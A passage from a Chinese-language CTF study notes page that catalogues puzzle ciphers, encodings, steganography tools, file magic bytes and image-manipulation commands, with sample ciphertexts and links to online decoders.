<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=913" >http://www.atoolbox.net/Tool.php?Id=913<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="AES加密">AES加密</h4>
<ul>
<li>
<p>不需要密钥</p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="http://tools.bugscaner.com/cryptoaes/" >http://tools.bugscaner.com/cryptoaes/<i class="fas fa-external-link-alt"></i></a></p>
<p>CyberChef中，IV设置为<code>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></p>
</li>
<li>
<p>需要密钥 密钥不足16字节需要补齐</p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_aes.html" >https://www.sojson.com/encrypt_aes.html<i class="fas fa-external-link-alt"></i></a></p>
<p>工具：CaptfEncoder</p>
</li>
</ul>
<h4 id="埃特巴什码-Atbash">埃特巴什码(Atbash)</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：(+w)v&amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN</span><br></pre></td></tr></table></figure>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.metools.info/code/atbash209.html" >https://www.metools.info/code/atbash209.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="DNA编码">DNA编码</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：AATTCAACAACATGCTGC</span><br></pre></td></tr></table></figure>
<p>脚本：<a class="link"   target="_blank" rel="noopener" href="https://github.com/omemishra/DNA-Genetic-Python-Scripts-CTF" >https://github.com/omemishra/DNA-Genetic-Python-Scripts-CTF<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="仿射密码">仿射密码</h4>
<p>有两个key，key-a为必须是(1,3,5,7,9,11,15,17,19,21,23,25)中的一个，key-b是0~25的数字</p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="http://www.hiencode.com/affine.html" >http://www.hiencode.com/affine.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="Brainfuck">Brainfuck</h4>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt; </span><br></pre></td></tr></table></figure>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://tool.bugku.com/brainfuck/" >https://tool.bugku.com/brainfuck/<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="Ook！">Ook！</h4>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240717105306234.png"
                        alt="image-20240717105306234"
                 ></p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://tool.bugku.com/brainfuck/" >https://tool.bugku.com/brainfuck/<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="与佛论禅-与熊论道-兽语加密">与佛论禅 / 与熊论道 / 兽语加密</h4>
<p>通常以<code>佛曰</code>和<code>熊曰</code>开头，中文乱码</p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="http://hi.pcmoe.net/" >http://hi.pcmoe.net/<i class="fas fa-external-link-alt"></i></a></p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/todousharp" >https://ctf.bugku.com/tool/todousharp<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="空白格-无字天书：">空白格 / 无字天书：</h4>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240717105639968.png"
                        alt="image-20240717105639968"
                 ></p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace" >https://www.w3cschool.cn/tryrun/runcode?lang=whitespace<i class="fas fa-external-link-alt"></i></a></p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace/" >https://vii5ard.github.io/whitespace/<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="Serpent解密">Serpent解密</h4>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.ssleye.com/ssltool/ser_cipher.html" >https://www.ssleye.com/ssltool/ser_cipher.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="零宽隐写">零宽隐写</h4>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html" >http://330k.github.io/misc_tools/unicode_steganography.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="Gronsfeld密码">Gronsfeld密码</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解密脚本</span></span><br><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Gronsfeld</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&#x27;</span></span><br><span class="line">key = [<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="number">63</span>,<span class="number">41</span>]</span><br><span class="line">secret = Gronsfeld(key).decipher(cipher)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(secret)</span><br></pre></td></tr></table></figure>
<h4 id="UUencode编码">UUencode编码</h4>
<p>有点像base85</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`</span><br><span class="line"># c55192c992036ef623372601ff3a&#125;</span><br></pre></td></tr></table></figure>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/uuencode.php" >https://www.qqxiuzi.cn/bianma/uuencode.php<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="AAencode编码">AAencode编码</h4>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密文：</span><br><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);</span><br></pre></td></tr></table></figure>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="http://www.hiencode.com/aaencode.html" >http://www.hiencode.com/aaencode.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="XXencode编码">XXencode编码</h4>
<p>和UUencode有点像</p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://try8.cn/tool/code/xxencode" >https://try8.cn/tool/code/xxencode<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="snow隐写">snow隐写</h4>
<p>在行尾附加空格和制表符来隐藏 ASCII 文本中的消息</p>
<p>官网：<a class="link"   target="_blank" rel="noopener" href="https://www.darkside.com.au/snow/" >https://www.darkside.com.au/snow/<i class="fas fa-external-link-alt"></i></a></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-C</code></td>
<td>如果隐藏，则压缩数据，或者如果提取，则会解压缩。</td>
</tr>
<tr>
<td><code>-Q</code></td>
<td>静音模式。如果未设置，则程序报告统计信息，例如压缩百分比和可用存储空间的数量。</td>
</tr>
<tr>
<td><code>-S</code></td>
<td>报告文本文件中隐藏消息的近似空间量。考虑线长度，但忽略其他选项。</td>
</tr>
<tr>
<td><code>-p password</code></td>
<td>如果设置为此，则在隐藏期间将使用此密码加密数据，或在提取期间解密。</td>
</tr>
<tr>
<td><code>-l line-length</code></td>
<td>在附加空格时，Snow将始终产生比此值短的线条。默认情况下，它设置为80。</td>
</tr>
<tr>
<td><code>-f message-file</code></td>
<td>此文件的内容将隐藏在输入文本文件中。</td>
</tr>
<tr>
<td><code>-m message-string</code></td>
<td>此字符串的内容将被隐藏在输入文本文件中。请注意，除非在字符串中包含一个换行符，否则在提取邮件时，否则不会打印换行符。</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>加密消息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-m</span> <span class="string">&quot;qsdz yyds&quot;</span> <span class="literal">-p</span> <span class="string">&quot;duzou&quot;</span> infile outfile</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>提取消息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-p</span> <span class="string">&quot;duzou&quot;</span> infile outfile</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>需要注意的是，<code>infile</code> 必须在 <code>outfile</code> 前，如果不填 <code>infile</code> 选项，则默认从标准输入中获得；如果不填 <code>outfile</code> 选项，则默认输出到标准输出中。</p>
<h4 id="中文电报">中文电报</h4>
<p>类似于四位数一组的编码</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5337 5337 2448 2448 0001 2448 0001 2161 1721 1869 6671 0008 3296 4430 0001 3945 0260 3945 1869 4574 5337 0344 2448 0037 5337 5337 0260 0668 5337 6671 0008 3296 1869 6671 0008 3296 1869 2161 1721 </span><br></pre></td></tr></table></figure>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/dianbao.php" >https://www.qqxiuzi.cn/bianma/dianbao.php<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="Quote-Printable编码">Quote-Printable编码</h4>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：=E6=8A=80=E6=9C=AF=E6=9C=89=E6=B8=A9=E5=BA=A6</span><br></pre></td></tr></table></figure>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://try8.cn/tool/code/qp" >https://try8.cn/tool/code/qp<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="中文ASCII码">中文ASCII码</h4>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">27880 30693 25915 21892 38450 23454 39564 23460 21457 36865 112 108 98 99 116 102 33719 21462 21069 27573 102 108 97 103 20851 27880 79 110 101 45 70 111 120 23433 20840 22242 38431 22238 22797 112 108 98 99 116 102 33719 21462 21518 27573 102 108 97 103</span><br></pre></td></tr></table></figure>
<p>加上 <code>&amp;</code> <code>#</code> <code>;</code></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#27880;&amp;#30693;&amp;#25915;&amp;#21892;&amp;#38450;&amp;#23454;&amp;#39564;&amp;#23460;&amp;#21457;&amp;#36865;&amp;#112;&amp;#108;&amp;#98;&amp;#99;&amp;#116;&amp;#102;&amp;#33719;&amp;#21462;&amp;#21069;&amp;#27573;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#20851;&amp;#27880;&amp;#79;&amp;#110;&amp;#101;&amp;#45;&amp;#70;&amp;#111;&amp;#120;&amp;#23433;&amp;#20840;&amp;#22242;&amp;#38431;&amp;#22238;&amp;#22797;&amp;#112;&amp;#108;&amp;#98;&amp;#99;&amp;#116;&amp;#102;&amp;#33719;&amp;#21462;&amp;#21518;&amp;#27573;&amp;#102;&amp;#108;&amp;#97;&amp;#103;</span><br></pre></td></tr></table></figure>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.xuhuhu.com/beautify/ascii/" >https://www.xuhuhu.com/beautify/ascii/<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="培根密码">培根密码</h4>
<p>由 a、b 或者 A、B 或者 0、1 组成的密文，密文中只有两种字符，可以直接使用<code> 随波逐流</code> 解密</p>
<p>CyberChef 的培根密码解密可能会有点问题，这里建议用随波逐流解密</p>
<h4 id="锟斤拷">锟斤拷</h4>
<p>成因是  Unicode 的替换字符（Replacement Character，�）于 UTF-8 编码下的结果 EF BF BD 重复，在 GBK 编码中被解释为汉字 “锟斤拷”（EF BF BD EF BF BD）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">input</span>(<span class="string">&#x27;请选择你的功能（1、加密 2、解密）：&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> a == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&#x27;请输入你要加密的话：&#x27;</span>)</span><br><span class="line">    utf = s.encode(<span class="string">&#x27;utf&#x27;</span>)</span><br><span class="line">    gbk = s.encode(<span class="string">&#x27;utf&#x27;</span>).decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s)%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        gbk = gbk + <span class="string">&quot;�&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(gbk)</span><br><span class="line">    os.system(<span class="string">&quot;pause&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> a == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&#x27;请输入你要解密的话：&#x27;</span>)</span><br><span class="line">    gbk = s.encode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    utf = s.encode(<span class="string">&#x27;gbk&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(utf)</span><br><span class="line">    os.system(<span class="string">&quot;pause&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="键盘坐标密码">键盘坐标密码</h4>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  1 2 3 4 5 6 7 8 9 0</span><br><span class="line">1 Q W E R T Y U I O P</span><br><span class="line">2 A S D F G H J K L</span><br><span class="line">3 Z X C V B N M</span><br></pre></td></tr></table></figure>
<p><code>11 21 31 18 27 33 34</code>    -&gt;    <code>QAZIJCV</code></p>
<h4 id="福尔摩斯-跳舞的小人">福尔摩斯 跳舞的小人</h4>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/xiaoren.jpeg"
                        alt="xiaoren"
                 ></p>
<h4 id="手机九宫格键盘密码">手机九宫格键盘密码</h4>
<p>82  73  42  31  22  31  33  41  32<br>
U     R    H   D    B     D   F    G    E</p>
<h4 id="利用编程代码画图">利用编程代码画图</h4>
<ol>
<li>LOGO编程语言【例题-[RCTF2019]draw 】<br>
在线编译器：<a class="link"   target="_blank" rel="noopener" href="https://www.calormen.com/jslogo/" >https://www.calormen.com/jslogo/<i class="fas fa-external-link-alt"></i></a></li>
<li>CFRS编程语言【例题-2024宁波市赛初赛 Misc2】<br>
在线画图网站：<a class="link"   target="_blank" rel="noopener" href="https://susam.net/cfrs.html" >https://susam.net/cfrs.html<i class="fas fa-external-link-alt"></i></a></li>
</ol>
<h4 id="spammimic编码">spammimic编码</h4>
<p><a class="link"   target="_blank" rel="noopener" href="https://spammimic.com/decode.cgi" >spammimic - decoded<i class="fas fa-external-link-alt"></i></a></p>
<p>HGAME 2024有一题，可识读英文可以转成中文乱码，ROT8000编码</p>
<p>强网拟态2024 OSINT也是</p>
<h4 id="malbolge">malbolge</h4>
<p>类似这样的</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;&amp;%:9]!~&#125;|z2Vxwv-,POqponl$Hjig%eB@@&gt;&#125;=&lt;M:9wv6WsU2T|nm-,jcL(I&amp;%$#&quot;</span><br><span class="line">`CB]V?Tx&lt;uVtT`Rpo3NlF.Jh++FdbCBA@?]!~|4XzyTT43Qsqq(Lnmkj&quot;Fhg$&#123;z@&gt;</span><br></pre></td></tr></table></figure>
<p>类似题：2024 强网拟态 PvZ</p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.malbolge.doleczek.pl/" >Malbolge - interpreter online (doleczek.pl)<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="PDU编码">PDU编码</h4>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0011000D91683106019196F40008AA104F60597D0067006F006F0064000A0033</span><br></pre></td></tr></table></figure>
<p><a class="link"   target="_blank" rel="noopener" href="http://www.sendsms.cn/pdu/" >PDU编码解码工具<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="解码工具">解码工具</h3>
<h4 id="Ciphey">Ciphey</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ciphey -t <span class="string">&quot;aGVsbG8gbXkgbmFtZSBpcyBiZWU=&quot;</span>	<span class="comment">#WSL</span></span><br></pre></td></tr></table></figure>
<h4 id="CyberChef">CyberChef</h4>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/gchq/CyberChef" >Github源代码<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://cyberchef.org/" >CyberChef在线网站<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="Basecrack">Basecrack</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 basecrack.py -m</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240717094116149.png"
                        alt="image-20240717094116149"
                 ></p>
<h4 id="随波逐流">随波逐流</h4>
<p><a class="link"   target="_blank" rel="noopener" href="http://www.1o1o.xyz/" >随波逐流工作室<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="文件头">文件头</h3>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.zip的文件头：50 4B 03 04 14 00 08 00</span><br><span class="line">.rar的文件头：52 61 72 21</span><br><span class="line">.rar的文件尾：C4 3D 7B 00 40 07 00</span><br><span class="line">.pyc的文件头：03 F3 0D 0A</span><br><span class="line">.jpg的文件头：FF　D8　FF</span><br><span class="line">.png的文件头：89 50 4e 47 0d 0a 1a 0a   文件尾：49 45 4E 44 AE 42 60 82</span><br><span class="line">	#Tips：PNG文件的前16字节是已知的：89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</span><br><span class="line">.gif的文件头：47 49 46 38 39 61（GIF89A）或 47 49 46 38 37 61（GIF87A）</span><br><span class="line">.gif的文件尾：00 3B</span><br><span class="line">.gz的文件头：1F 8B 08 00</span><br><span class="line">.pyc的文件头：03 F3 0D 0A</span><br><span class="line">.psd的文件头：38 42 50 53</span><br><span class="line">TIFF (tif)，文件头：49492A00</span><br><span class="line">Windows [Bitmap](https://so.csdn.net/so/search?q=Bitmap&amp;spm=1001.2101.3001.7020) (bmp)，文件头：424D</span><br><span class="line">CAD (dwg)，文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，文件头：7B5C727466</span><br><span class="line">XML (xml)，文件头：3C3F786D6C</span><br><span class="line">HTML (html)，文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，文件头：2142444E</span><br><span class="line">MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，文件头：FF575043</span><br><span class="line">Postscript (eps.or.ps)，文件头：252150532D41646F6265</span><br><span class="line">Adobe Acrobat (pdf)，文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，文件头：E3828596</span><br><span class="line">Wave (wav)，文件头：57415645</span><br><span class="line">AVI (avi)，文件头：41564920</span><br><span class="line">Real Audio (ram)，文件头：2E7261FD</span><br><span class="line">Real Media (rm)，文件头：2E524D46</span><br><span class="line">MPEG (mpg)，文件头：000001BA</span><br><span class="line">MPEG (mpg)，文件头：000001B3</span><br><span class="line">Quicktime (mov)，文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，文件头：4D546864</span><br><span class="line">M4a，文件头：00000018667479704D3441</span><br></pre></td></tr></table></figure>
<h3 id="图片通用隐写">图片通用隐写</h3>
<h4 id="属性-详细信息">属性-详细信息</h4>
<p>Hint或Key可能藏在属性里</p>
<h4 id="010Editor检查文件末尾">010Editor检查文件末尾</h4>
<p>flag可能藏在文件末尾</p>
<h4 id="010Editor检查文件头">010Editor检查文件头</h4>
<p>可能存在文件头和文件后缀名不一致导致打不开的情况</p>
<h4 id="binwalk-foremost">binwalk &amp; foremost</h4>
<p>binwalk查看，foremost提取</p>
<h4 id="盲水印隐写">盲水印隐写</h4>
<p>项目地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/chishaxie/BlindWaterMark" >https://github.com/chishaxie/BlindWaterMark<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bwm.py 程序文件python2版本</span><br><span class="line">bwmforpy3.py 程序文件python***3.6***版本</span><br><span class="line">hui.png 无水印的原图</span><br><span class="line">wm.png 水印图</span><br><span class="line">hui_with_wm.png 有盲水印的图</span><br><span class="line">wm_from_hui.png 反解出来的水印图</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwm.py encode hui.png wm.png hui_with_wm.png			<span class="comment">#加密</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwm.py decode hui.png hui_with_wm.png wm_from_hui.png		<span class="comment">#解密</span></span><br></pre></td></tr></table></figure>
<h4 id="频域盲水印">频域盲水印</h4>
<p>Puzzle Solver一把梭</p>
<h4 id="图片分离-拼接">图片分离 / 拼接</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#WSL</span></span><br><span class="line">分解GIF的命令：convert glance.gif flag.png</span><br><span class="line">水平镜像翻转图片：convert -flop reverse.jpg reversed.jpg</span><br><span class="line">垂直镜像翻转图片：convert -flip reverse.jpg reversed.jpg</span><br><span class="line">合成图片的命令：montage flag*.png -tile x1 -geometry +0+0 flag.png</span><br><span class="line">-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</span><br><span class="line">-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可</span><br></pre></td></tr></table></figure>
<h4 id="OurSecret隐写">OurSecret隐写</h4>
<p>拖进OurSecret输入密钥进行解密</p>
<h4 id="拼图">拼图</h4>
<p><strong>碎图片合成一张图片</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在Windows中使用imagemagick处理</span></span><br><span class="line">magick.exe montage *.png -tile 18x10 -geometry 125x125+0+0 flag.jpg</span><br><span class="line">magick montage *.png -tile 40x22 -geometry +0+0 flag-0.png</span><br></pre></td></tr></table></figure>
